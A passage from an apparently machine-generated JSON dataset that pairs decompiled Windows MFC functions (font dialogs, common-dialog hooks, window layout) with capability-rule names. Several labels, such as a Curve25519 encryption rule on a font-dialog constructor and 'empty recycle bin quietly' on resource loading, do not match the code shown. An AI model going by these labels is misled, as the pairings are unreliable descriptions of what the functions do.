        "token_count": 607
    },
    "0042e39e": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e39e(uchar *arg_8h, uchar *arg_ch, uchar *arg_10h, uchar *arg_14h)\n\n{\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x466, 0, &var_4h);\n    *arg_8h = var_4h >> 0x18;\n    *arg_ch = var_4h >> 0x10;\n    *arg_10h = var_4h >> 8;\n    *arg_14h = var_4h;\n    return;\n}\n",
        "token_count": 167
    },
    "0043a5b4": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043a5b4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t lptm;\n    int32_t var_84h;\n    int32_t var_5ch;\n    uint *var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint hdc;\n    int32_t var_40h;\n    uint var_30h;\n    uint var_29h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    var_54h = arg_18h;\n    hdc = (*_sym.imp.USER32.dll_GetDC)(0);\n    fcn.00459330(&var_40h, 0, 0x3c);\n    uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(hdc, 0x5a, 0x48);\n    pcVar2 = _sym.imp.KERNEL32.dll_MulDiv;\n    var_40h = (*_sym.imp.KERNEL32.dll_MulDiv)(arg_ch, uVar4);\n    var_40h = -var_40h;\n    var_30h = 400;\n    var_29h._0_1_ = 1;\n    uVar4 = fcn.00458fdb(&var_24h, 0x20, arg_8h, 0xffffffff);\n    fcn.0040e7f0(uVar4);\n    var_4ch = (*_sym.imp.GDI32.dll_CreateFontIndirectA)(&var_40h);\n    pcVar3 = _sym.imp.USER32.dll_GetDialogBaseUnits;\n    pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n    if (var_4ch == 0) {\n        var_48h = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        var_48h = var_48h & 0xffff;\n        uVar5 = (*pcVar3)();\n        uVar5 = uVar5 >> 0x10;\n    }\n    else {\n        var_50h = (*_sym.imp.GDI32.dll_SelectObject)(hdc, var_4ch);\n        (*_sym.imp.GDI32.dll_GetTextMetricsA)(hdc, &lptm);\n        uVar5 = var_84h + lptm;\n        (*_sym.imp.GDI32.dll_GetTextExtentPoint32A)\n                  (hdc, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\", 0x34, &var_5ch);\n        var_48h = (var_5ch + 0x1a) / 0x34;\n        (*pcVar1)(hdc, var_50h);\n        (*_sym.imp.GDI32.dll_DeleteObject)(var_4ch);\n        arg_18h = var_54h;\n    }\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, hdc);\n    uVar4 = (*pcVar2)(arg_10h, var_48h, 4);\n    *arg_18h = uVar4;\n    uVar4 = (*pcVar2)(arg_14h, uVar5, 8);\n    arg_18h[1] = uVar4;\n    fcn.004566a8(arg_10h);\n    return;\n}\n",
        "token_count": 809
    },
    "00443474": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.00443474(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x400, 0, 0);\n    if (uVar1 >> 0x10 == 0x534b) {\n        uVar1 = uVar1 & 0xffff;\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 118
    },
    "0044440b": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044440b(int32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    \n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar3 = fcn.00431568(0x419034);\n        if (iVar3 == 0) {\n            fcn.0041901a();\n        }\n        if ((*(iVar3 + 0x18) != 0) && (iVar4 = fcn.0041e6a5(arg_8h),  iVar4 == 0)) {\n            fcn.0041f64b(arg_8h);\n            *(iVar3 + 0x18) = 0;\n        }\n        pcVar1 = _sym.imp.USER32.dll_RegisterWindowMessageA;\n        if (arg_ch == 0x110) {\n            *0x4ad488 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(\"commdlg_LBSelChangedNotify\");\n            *0x4ad48c = (*pcVar1)(\"commdlg_ShareViolation\");\n            *0x4ad490 = (*pcVar1)(\"commdlg_FileNameOK\");\n            *0x4ad494 = (*pcVar1)(\"commdlg_ColorOK\");\n            *0x4ad498 = (*pcVar1)(\"commdlg_help\");\n            *0x4ad49c = (*pcVar1)(\"commdlg_SetRGBColor\");\n            uVar2 = fcn.00426919(arg_8h, 0x110, arg_10h, arg_14h);\n        }\n        else if ((arg_ch == *0x4ad498) || ((arg_ch == 0x111 && (arg_10h == 0x40e)))) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x111, 0xe146, 0);\n            uVar2 = 1;\n        }\n        else {\n            if (((0xbfff < arg_ch) && (piVar5 = fcn.0041e6a5(arg_8h),  piVar5 != NULL)) &&\n               ((iVar3 = fcn.004306e6(0x48e7e0),  iVar3 == 0 ||\n                (iVar3 = fcn.0042f6ee(),  (*(iVar3 + 0x34) & 0x80000) == 0)))) {\n                if (arg_ch == *0x4ad48c) {\n                    uVar2 = (**(*piVar5 + 0x15c))(arg_14h);\n                    return uVar2;\n                }\n                if (arg_ch == *0x4ad490) {\n                    piVar5[0x71] = arg_14h;\n                    uVar2 = (**(*piVar5 + 0x160))();\n                    piVar5[0x71] = 0;\n                    return uVar2;\n                }\n                if (arg_ch == *0x4ad488) {\n                    (**(*piVar5 + 0x164))(arg_10h, arg_14h & 0xffff, arg_14h >> 0x10);\n                }\n                else if (arg_ch == *0x4ad494) {\n                    uVar2 = (**(*piVar5 + 0x15c))();\n                    return uVar2;\n                }\n            }\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 809
    },
    "0044db25": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044db25(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x20));\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (iVar2 == 0) {\n        *(in_ECX + 0xac) = arg_8h;\n        *(in_ECX + 0xb0) = arg_ch;\n        *(in_ECX + 0xa4) = arg_10h;\n        *(in_ECX + 0xa8) = arg_14h;\n    }\n    else {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x420, 0, arg_10h & 0xffff | arg_14h << 0x10);\n        (*pcVar1)(*(in_ECX + 0x20), 0x41f, 0, arg_8h & 0xffff | arg_ch << 0x10);\n        if (0x5ffff < *0x4a9b88) {\n            uVar3 = (*pcVar1)(*(in_ECX + 0x20), 0x43a, 0, 0);\n            *(in_ECX + 0xac) = uVar3 & 0xffff;\n            *(in_ECX + 0xb0) = uVar3 >> 0x10;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), 0, 1);\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "0044de3f": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044de3f(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *arg_ch_00;\n    uint var_18h;\n    char var_10h;\n    uint var_fh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    arg_ch_00 = 0x44de5e;\n    fcn.0044d4a0(arg_8h, &fcn.0044de3f::var_18h);\n    cVar1 = arg_ch >> 0x10;\n    if ((var_fh != arg_ch) || (var_10h != cVar1)) {\n        arg_ch_00 = &fcn.0044de3f::var_18h;\n        var_10h = cVar1;\n        var_fh._0_1_ = arg_ch;\n        fcn.0044dca2(arg_8h, arg_ch_00);\n        *(in_ECX + 0xa0) = 1;\n    }\n    fcn.004566a8(arg_ch_00);\n    return;\n}\n",
        "token_count": 277
    },
    "0044e15c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044e15c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint *arg_ch_00;\n    uint var_2ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_10h;\n    uint var_fh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.0044d4a0(arg_8h, &var_18h);\n    arg_ch_00 = 0x14;\n    uVar1 = fcn.00456177(&var_2ch, 0x14, &var_18h, 0x14);\n    fcn.0040e7f0(uVar1);\n    var_14h = arg_ch;\n    var_18h = arg_14h;\n    var_fh._0_1_ = arg_10h;\n    var_10h = arg_10h >> 0x10;\n    iVar2 = fcn.0045ac18(&var_2ch, &var_18h, 0x14);\n    if (iVar2 != 0) {\n        arg_ch_00 = &var_18h;\n        fcn.0044dca2(arg_8h, arg_ch_00);\n        *(in_ECX + 0xa0) = 1;\n    }\n    fcn.004566a8(arg_ch_00);\n    return;\n}\n",
        "token_count": 370
    },
    "0041a796": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a796(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = *(arg_10h + 4);\n    if (uVar1 < 0x20c) {\n        if (uVar1 == 0x20b) {\n            fcn.00419d24(&var_10h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x1e) {\n            (**(*arg_18h + 0x1c))();\n            return 1;\n        }\n        if (uVar1 == 0x103) {\n            (**(*arg_18h + 0x34))(*(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x127) {\n            (**(*arg_18h + 0x20))(*(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x12d) {\n            uVar5 = *(arg_ch + *(arg_10h + 6) * 4);\n            iVar3 = (*_sym.imp.GDI32.dll_GetObjectType)(uVar5);\n            if (iVar3 == 0) {\n                var_4h = (*_sym.imp.GDI32.dll_GetStockObject)(0xd);\n                pcVar2 = _sym.imp.GDI32.dll_SelectObject;\n                uVar4 = (*_sym.imp.GDI32.dll_SelectObject)(arg_18h[1], var_4h);\n                var_8h = (*pcVar2)(arg_18h[1], uVar5);\n                if (var_8h == var_4h) {\n                    uVar5 = fcn.0041a541(uVar5);\n                    iVar3 = *arg_18h;\ncode_r0x0041a85e:\n                    (**(iVar3 + 0x28))(uVar5);\n                    return 1;\n                }\n                (*pcVar2)(arg_18h[1], uVar4);\n                (*pcVar2)(arg_18h[1], var_8h);\n            }\n            else if (iVar3 == 6) {\n                uVar5 = fcn.0041a541(uVar5);\n                iVar3 = *arg_18h;\n                goto code_r0x0041a85e;\n            }\n        }\n        else {\n            if (uVar1 == 0x201) {\n                (**(*arg_18h + 0x2c))(*(arg_10h + 6));\n                return 1;\n            }\n            if (uVar1 == 0x209) {\n                (**(*arg_18h + 0x30))(*(arg_10h + 6));\n                return 1;\n            }\n        }\n    }\n    else {\n        if (uVar1 == 0x20c) {\n            (**(*arg_18h + 0x48))(&var_40h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x20d) {\n            (**(*arg_18h + 0x38))(&var_38h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x20e) {\n            (**(*arg_18h + 0x40))(&var_30h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x211) {\n            (**(*arg_18h + 0x3c))(&var_28h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x410) {\n            (**(*arg_18h + 0x4c))(&var_20h, *(arg_10h + 0xc), *(arg_10h + 10), *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x412) {\n            (**(*arg_18h + 0x44))(&var_18h, *(arg_10h + 0xc), *(arg_10h + 10), *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n    }\n    (*_sym.imp.GDI32.dll_PlayMetaFileRecord)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return 1;\n}\n",
        "token_count": 1183
    },
    "0044598e": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044598e(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    if ((((param_2 != 0) && (param_2 != 6)) && (param_2 != 7)) && ((param_2 != 8 && (param_2 != 4)))) {\n        uVar1 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(param_1 + 0x20));\n        (*_sym.imp.USER32.dll_BringWindowToTop)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004372ad": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004372ad(int32_t arg_8h, uint32_t lpPoint, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    while( true ) {\n        (*_sym.imp.USER32.dll_ScreenToClient)(arg_8h, &lpPoint);\n        iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x366, 0, lpPoint & 0xffff | arg_10h << 0x10);\n        (*_sym.imp.USER32.dll_ClientToScreen)(arg_8h, &lpPoint);\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_8h, 0xfffffff0);\n        if (((uVar2 & 0x40000000) == 0) || (arg_8h = (*_sym.imp.USER32.dll_GetParent)(arg_8h),  arg_8h == 0)) break;\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return -1;\n}\n",
        "token_count": 266
    },
    "00447339": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00447339(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x11);\n    if (iVar2 < 0) {\n        uVar3 = 8;\n    }\n    else {\n        uVar3 = 0;\n    }\n    iVar2 = (*pcVar1)(0x10);\n    if (iVar2 < 0) {\n        uVar4 = 4;\n    }\n    else {\n        uVar4 = 0;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n    iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    if (iVar5 == 0) {\n        iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x20a, arg_8h << 0x10 | uVar3 | uVar4, arg_ch);\n    }\n    else {\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x20a, arg_8h << 0x10 | uVar3 | uVar4, arg_ch);\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(iVar5);\n            if (iVar7 != 0) {\n                return iVar7;\n            }\n            if (iVar5 == 0) {\n                return 0;\n            }\n        } while (iVar5 != iVar6);\n    }\n    return iVar7;\n}\n",
        "token_count": 418
    },
    "0044d549": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d549(uint arg_8h)\n\n{\n    uint var_18h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.0044d4a0(arg_8h, &var_18h);\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 101
    },
    "0044d66a": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044d66a(uint arg_8h, uint *arg_ch, uint32_t *arg_10h, uint *arg_14h)\n\n{\n    uint unaff_ESI;\n    uint var_18h;\n    uint var_14h;\n    uint8_t var_10h;\n    uint var_fh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.0044d4a0(arg_8h, &var_18h);\n    *arg_ch = var_14h;\n    *arg_10h = var_10h << 0x10 | var_fh;\n    *arg_14h = var_18h;\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 196
    },
    "00425377": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.00425377(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042b206();\n    return iVar1 + 0x30;\n}\n",
        "token_count": 44
    },
    "0044e747": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044e747(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.0042b7b9();\n    uVar1 = *(iVar2 + 0xc);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar1, arg_8h, 0xf1);\n    if (((iVar2 != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar1, iVar2),  iVar2 != 0)) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2),  iVar3 != 0)) {\n        arg_8h_00 = fcn.004170b4(*(iVar3 + 6) * 4);\n        iVar4 = 0;\n        if (*(iVar3 + 6) != 0) {\n            puVar5 = iVar3 + 8;\n            do {\n                *(arg_8h_00 + iVar4 * 4) = *puVar5;\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            } while (iVar4 < *(iVar3 + 6));\n        }\n        iVar4 = fcn.0044d362(arg_8h_00, *(iVar3 + 6));\n        fcn.004170df(arg_8h_00);\n        if (iVar4 != 0) {\n            fcn.0044db25(*(iVar3 + 2) + 7, *(iVar3 + 4) + 7, *(iVar3 + 2), *(iVar3 + 4));\n            iVar4 = fcn.0044dc41(arg_8h);\n        }\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar2);\n        return iVar4;\n    }\n    return 0;\n}\n",
        "token_count": 466
    },
    "00429b1b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t fcn.00429b1b(uint32_t *param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *param_1;\n    iVar2 = fcn.00429ae0();\n    if (iVar2 == 0) {\n        piVar3 = param_1 + 0x12;\n    }\n    else {\n        uVar4 = param_1[3];\n        piVar3 = param_1 + 0x1a;\n    }\n    if (*piVar3 == -1) {\n        piVar3 = piVar3 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar3 == -1) {\n        piVar3 = piVar3 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    if ((uVar4 & 0x40) != 0) {\n        piVar3 = piVar3 + (iVar2 != 0) * 2 + 1;\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    return piVar3 + 3U & 0xfffffffc;\n}\n",
        "token_count": 386
    },
    "00440150": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00440150(int32_t param_1, uint param_2, uint *param_3)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    \n    if (param_3 == NULL) {\n        fcn.00401070(0x80004005);\n    }\n    uVar2 = fcn.0043c682(*0x10);\n    if (uVar2 == '\\0') {\n        uVar2 = uVar2 & 0xffffff00;\n    }\n    else {\n        iVar3 = unaff_ESI * 0x30 + *(param_1 + 0x14);\n        uVar1 = *((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(param_1 + 8));\n        *param_3 = uVar1;\n        uVar2 = CONCAT31(uVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 241
    },
    "0042f099": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042f099(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00426a40(0, *(unaff_EBP + 0x14));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CFontDialog.0;\n    fcn.00459330(extraout_ECX + 0x1d, 0, 0x3c);\n    fcn.00459330(extraout_ECX + 0x2c, 0, 0x3c);\n    fcn.00459330(extraout_ECX + 0x3b, 0, 0x40);\n    uVar1 = *(unaff_EBP + 0xc);\n    pcVar2 = *(unaff_EBP + 8);\n    extraout_ECX[0x15] = 0x7006;\n    extraout_ECX[0x1d] = 0x3c;\n    extraout_ECX[0x28] = extraout_ECX + 0x3b;\n    extraout_ECX[0x22] = uVar1 | 8;\n    extraout_ECX[0x25] = fcn.0044440b;\n    if (pcVar2 == NULL) {\n        extraout_ECX[0x20] = extraout_ECX + 0x2c;\n    }\n    else {\n        extraout_ECX[0x22] = uVar1 | 0x48;\n        extraout_ECX[0x20] = pcVar2;\n        fcn.00417b17(extraout_ECX + 0x2c, 0x3c, pcVar2, 0x3c);\n    }\n    if (*(unaff_EBP + 0x10) != 0) {\n        pcVar2 = *(*(unaff_EBP + 0x10) + 4);\n        extraout_ECX[0x22] = extraout_ECX[0x22] | 2;\n        extraout_ECX[0x1f] = pcVar2;\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 600
    },
    "0044cba6": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044cba6(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    uint arg_10h;\n    uint uStack300;\n    int32_t iStack292;\n    int32_t iStack288;\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [80];\n    uchar auStack188 [180];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack188;\n    iStack276 = param_2;\n    iStack272 = param_3;\n    if (param_1 != 0) goto code_r0x0044cbe3;\n    do {\n        fcn.0041901a();\ncode_r0x0044cbe3:\n    } while (param_2 == 0);\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x20), &stack0xfffffec4);\n    if (*(param_2 + 0x8c) == param_1) {\n        if (iStack272 == 0) goto code_r0x0044ce14;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(&stack0xfffffec4, iStack272);\n        if (iVar2 != 0) goto code_r0x0044ce14;\n    }\n    if ((*(param_1 + 0x94) != 0) && ((*(param_2 + 0x84) & 0x40) != 0)) {\n        *(param_1 + 0x80) = *(param_1 + 0x80) | 0x40;\n    }\n    *(param_1 + 0x80) = *(param_1 + 0x80) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x80);\n    *(param_1 + 0x80) = *(param_2 + 0x80) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.00422e15(auStack268, 0x104);\n        fcn.00431d30(*(param_1 + 0x20), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x80) ^ *(param_1 + 0x80)) & 0xf000 ^ *(param_2 + 0x80);\n    if (*(param_1 + 0x94) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.0045190e(uVar3);\n    bVar1 = false;\n    if (*(param_2 + 0x8c) != param_1) {\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_2 + 0x20));\n        if (iVar2 != 0) {\n            fcn.00422a19(0, 0, 0, 0, 0, 0x97);\n            bVar1 = true;\n        }\n    }\n    uStack300 = 0xffffffff;\n    if (iStack272 == 0) {\n        fcn.00444dc0(*(param_1 + 0xa0), param_2);\n        fcn.00444dc0(*(param_1 + 0xa0), 0);\n        fcn.00422a19(0, -*0x4ad208, -*0x4ad20c, 0, 0, 0x115);\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack292, iStack272);\n        fcn.00419ea1(&iStack292);\n        uStack300 = fcn.0044c0bd(iStack276, iStack292, iStack288, iStack284, iStack280, \n                                 (iStack284 - iStack292) / 2 + iStack292, (iStack280 - iStack288) / 2 + iStack288);\n        fcn.00422a19(0, iStack292, iStack288, iStack284 - iStack292, iStack280 - iStack288, 0x114);\n        param_2 = iStack276;\n    }\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x20));\n    iVar2 = fcn.0041e67e();\n    if (iVar2 != param_1) {\n        fcn.0044bea6(param_1);\n    }\n    iVar2 = *(param_2 + 0x8c);\n    if (iVar2 == param_1) {\n        arg_10h = 0;\ncode_r0x0044cddf:\n        fcn.0044c47b(param_2, uStack300, arg_10h);\n    }\n    else if (iVar2 != 0) {\n        if ((*(param_1 + 0x94) == 0) || (*(iVar2 + 0x94) != 0)) {\n            arg_10h = 0;\n        }\n        else {\n            arg_10h = 1;\n        }\n        uStack300 = 0xffffffff;\n        goto code_r0x0044cddf;\n    }\n    *(param_2 + 0x8c) = param_1;\n    if (bVar1) {\n        fcn.00422a19(0, 0, 0, 0, 0, 0x57);\n    }\n    fcn.0044c414(param_2);\n    iVar2 = fcn.004459bd();\n    *(iVar2 + 0xd0) = *(iVar2 + 0xd0) | 0xc;\ncode_r0x0044ce14:\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 1372
    },
    "00431de8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00431de8(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004538fd": {
        "rules": [
            "hash data using djb2/6ad21e310d674441ba35d7276afbe57d",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
